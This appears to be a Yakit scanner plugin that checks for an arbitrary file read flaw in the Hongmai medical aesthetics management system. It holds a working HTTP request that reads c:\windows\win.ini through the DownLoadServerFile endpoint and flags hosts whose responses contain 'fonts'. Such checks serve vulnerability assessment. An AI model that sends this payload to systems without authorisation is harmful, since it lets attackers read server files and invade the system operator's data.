# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /zh-CN/PublicInterface/DownLoadServerFile HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
If-None-Match: "5378f991021da1:0"
Content-Type: application/x-www-form-urlencoded

filePath=c:\\windows\win.ini`

    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    if str.MatchAllOfSubString(rsp, `fonts`){
        yakit.Info("%v found 宏脉医美行业管理系统任意文件读取漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("宏脉医美行业管理系统任意文件读取漏洞"),
        risk.severity("medium"),
        risk.titleVerbose("宏脉医美行业管理系统任意文件读取漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
